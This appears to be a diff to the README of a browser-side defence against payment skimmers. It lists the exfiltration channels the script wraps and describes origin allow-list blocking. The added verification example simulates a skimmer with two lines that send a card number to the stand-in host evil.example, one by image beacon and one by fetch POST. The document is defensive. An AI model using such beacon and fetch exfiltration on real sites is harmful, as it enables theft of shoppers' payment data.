@@ -67,3 +67,18 @@ Real checkout E2E against production: after learning `api.stripe.com`, `js.strip
 Magecart script (`evil-cdn.ru`), a payment form-jack (`phish-pay.ru`), and a clickjack frame
 (`clickjack.ru`). Unit tests (`node test.cjs`): 7/7, including the live image-beacon and WebSocket
 hooks.
+
+## Full coverage & safe-unlock
+
+Load the `<script>` **first in `<head>`**, before any third-party tag, so every client-side channel is wrapped from the start. It covers **every exfil / code-load channel** a skimmer uses:
+
+`fetch` · `XMLHttpRequest` · `sendBeacon` · **Image beacons** (property *and* `setAttribute`) · `WebSocket` · `EventSource` · **`Worker` / `SharedWorker` / `ServiceWorker`** · `<script>` / `<iframe>` injection · **`<link rel=preload/prefetch>`** · `<img srcset>` · **`<a ping>`** · form-jacking · clickjacking — including resources re-pointed by attribute mutation.
+
+Blocking is by destination **origin** (a learned allow-list — like a CSP you curate in the console). First-party is always allowed; off-baseline third-party exfil is blocked in enforce mode. Fail-open, never breaks the page.
+
+**Verify coverage** — simulate a skimmer beacon and confirm the console records/blocks it:
+
+```js
+new Image().src = "https://evil.example/?cc=4111111111111111"; // off-baseline origin → blocked in enforce
+fetch("https://evil.example/steal", { method: "POST", body: "cc=..." }).catch(() => {}); // rejected
+```
